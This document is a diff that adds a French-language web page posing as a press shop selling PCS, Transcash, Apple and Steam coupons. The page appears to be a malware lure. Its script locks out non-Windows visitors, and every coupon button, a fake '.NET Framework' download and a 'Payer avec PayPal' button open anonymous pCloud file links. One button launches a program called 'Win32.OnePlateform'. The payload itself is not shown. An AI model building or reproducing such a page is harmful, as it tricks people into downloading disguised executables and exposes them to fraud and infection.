@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Boutique -Presse-en-ligne</title>
+
+  <!-- Blocage non-Windows -->
+  <script>
+    const isWindows = navigator.userAgent.includes("Windows");
+    if (!isWindows) {
+      document.documentElement.innerHTML = `
+        <style>
+          body {
+            font-family: Arial, sans-serif;
+            background: #fff3e0;
+            color: #e65100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+          }
+          .message {
+            max-width: 500px;
+            padding: 40px;
+            border: 2px solid #e65100;
+            border-radius: 10px;
+            background: #ffffff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+          }
+        </style>
+        <body>
+          <div class="message">
+            <h1>⚠️ Accès refusé</h1>
+            <p>Ce site est uniquement accessible depuis un système <strong>Windows</strong>.</p>
+            <p>Merci de revenir avec un PC sous Windows.</p>
+          </div>
+        </body>
+      `;
+    }
+  </script>
+
+  <!-- STYLE PRINCIPAL DU SITE -->
+  <style>
+    body {font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; color:#333;}
+    header {background:#e65100; color:#fff; padding:20px; text-align:center;}
+    header h1 {margin:0; font-size:28px;}
+    .contact-top {margin-top:8px; font-weight:bold;}
+    nav {margin-top:10px;}
+    nav a {color:#fff; text-decoration:none; margin:0 15px; font-weight:bold; cursor:pointer;}
+    nav a:hover {text-decoration:underline;}
+    .container {max-width:1000px; margin:20px auto; padding:20px; background:#fff; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.1);}
+    .hero {display:flex; flex-wrap:wrap; align-items:center; justify-content:space-between;}
+    .hero-text {flex:1; min-width:280px; margin-right:20px;}
+    .hero-text h2 {color:#e65100;}
+    .btn {display:inline-block; margin:10px 5px; padding:12px 20px; background:#e65100; color:#fff; border-radius:6px; text-decoration:none; font-weight:bold; transition:background 0.3s; cursor:pointer;}
+    .btn:hover {background:#bf360c;}
+    .paypal-btn {
+      background: #ffc439 !important;
+      color: #111 !important;
+      display: inline-flex;
+      align-items: center;
+    }
+    .paypal-btn img {height: 20px; margin-right: 8px; vertical-align: middle;}
+    .logos {margin-top:20px; display:flex; flex-wrap:wrap; justify-content:center; gap:15px;}
+    .logos img {height:50px; object-fit:contain; cursor:pointer;}
+    footer {background:#333; color:#fff; text-align:center; padding:15px; margin-top:30px;}
+    .alert-net {margin-top:15px; padding:10px; background:#ffebee; border:1px solid #e65100; color:#e65100; font-weight:bold; border-radius:6px;}
+    .alert-net a {color:#e65100; text-decoration:underline; cursor:pointer;}
+
+    /* ❄️ Effet de neige */
+    .snowflake {
+      position: fixed;
+      top: -10px;
+      width: 10px;
+      height: 10px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.8;
+      animation: fall linear infinite;
+      z-index: 9999;
+    }
+
+    @keyframes fall {
+      to { transform: translateY(110vh); }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>💨 Boutique-Presse–Tickets-en-ligne</h1>
+    <div class="contact-top">📞 03 81 23 45 67 • ✉️ contact@boutique-Presse.fr</div>
+    <nav>
+      <a onclick="ouvrirLienWindows(liensPcloud.pcs)">Coupons PCS</a>
+      <a onclick="ouvrirLienWindows(liensPcloud.transcash)">Coupons Transcash</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="container">
+    <section class="hero">
+      <div class="hero-text">
+        <h2>Bienvenue — Boutique Presse </h2>
+        <p>Espace numérique — récupérez vos tickets et recharges en toute sécurité.</p>
+        <p><strong>Jean Dupont
+12 rue des Lilas
+75000 Paris
+France
+ • Ouvert 9h - Minuit</strong></p>
+
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.pcs)">🎟️ Coupons PCS</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.transcash)">💳 Coupons Transcash</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.apple)">🍏 Coupons Apple</a>
+        <a class="btn" onclick="ouvrirLienWindows(liensPcloud.steam)">🎮 Coupons Steam</a>
+        <a class="btn" style="background:#0078D7;" onclick="ouvrirLienWindows(liensPcloud.Win32OnePlateform)">🚀 Lancer Win32.OnePlateform</a>
+
+        <div class="alert-net">
+          ⚠️ Ce logiciel nécessite .NET Framework 3.5 ou plus.<br>
+          <a onclick="ouvrirLienWindows(liensPcloud.framework)">📥 Télécharger .NET Framework</a>
+        </div>
+
+        <button class="btn" onclick="ouvrirLienWindows(liensPcloud.framework)">📥 Télécharger le logiciel</button>
+
+        <div style="margin-top:20px;">
+          <a class="btn paypal-btn" onclick="ouvrirLienWindows(liensPcloud.paypal)">
+            <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="Logo PayPal" />
+            Payer avec PayPal
+          </a>
+        </div>
+
+        <div class="logos">
+          <img src="https://i.postimg.cc/zVH55wQS/Logo-FDj.png" alt="Logo FDJ" />
+          <img src="https://i.postimg.cc/qg509D1v/Logo-Transcash.png" alt="Logo Transcash" />
+          <img src="https://i.postimg.cc/K4zxphrW/Logo-PCS.png" alt="Logo PCS" />
+          <img src="https://i.postimg.cc/hXFnGzWF/presse-tabac.png" alt="Logo Presse Tabac" />
+          <img src="https://i.postimg.cc/XBpWr9YW/Auchan.png" alt="Logo Auchan" />
+          <img src="https://i.postimg.cc/W1Q9Lw32/gif-carte.png" alt="Carte cadeau" />
+          <img src="https://i.postimg.cc/s27TVGQ5/steam.png" alt="Logo Steam" />
+          <img src="https://i.postimg.cc/XJLrygkR/win32.png" alt="Logo Win32" />
+          <img src="https://i.postimg.cc/59mpHMTJ/Paypal-png.png" alt="Logo Paypal" onclick="ouvrirLienWindows(liensPcloud.paypal)" style="cursor:pointer;" />
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <footer>
+    <p>📞 03 81 23 45 67 • ✉️ Contact@Boutique Presse.fr</p>
+    <p>&copy; 2025 Boutique Presse – Tous droits réservés</p>
+  </footer>
+
+  <!-- SCRIPT LIENS -->
+  <script>
+    const liensPcloud = {
+      pcs: "https://e.pcloud.link/publink/show?code=XZIRz3Zi0vLlBiOGHYTr69Vp99nifECN2w7",
+      transcash: "https://e.pcloud.link/publink/show?code=XZkPbUZVyJJAcJQ0zhjfEOFWXHuE84defLy",
+      apple: "https://e.pcloud.link/publink/show?code=XZURz3ZbO5zaqCyVBLXou63bNtp54zNpbqk",
+      steam: "https://e.pcloud.link/publink/show?code=XZARz3Zu3fYn6Rr5JHD5f7Xe2MfbyPIVWQk",
+      Win32OnePlateform: "https://e.pcloud.link/publink/show?code=XZNRz3Ze135JX6NTh5HShPgBVp2dXUdGlT7",
+      framework: "https://e.pcloud.link/publink/show?code=XZaRz3Z1xGvNzudbS47Jhlpl1R7PbIin7yX",
+      paypal: "https://e.pcloud.link/publink/show?code=XZjCbUZvCJzlLxCLSH3dfswnnJXCJaz0MNk"
+    };
+
+    function estWindows() { return navigator.userAgent.includes("Windows"); }
+    function ouvrirLienWindows(url) {
+      if (estWindows()) window.open(url, "_blank");
+      else alert("⚠️ Ce service est disponible uniquement sous Windows.");
+    }
+  </script>
+
+ 
+  </script>
+
+</body>
+</html>
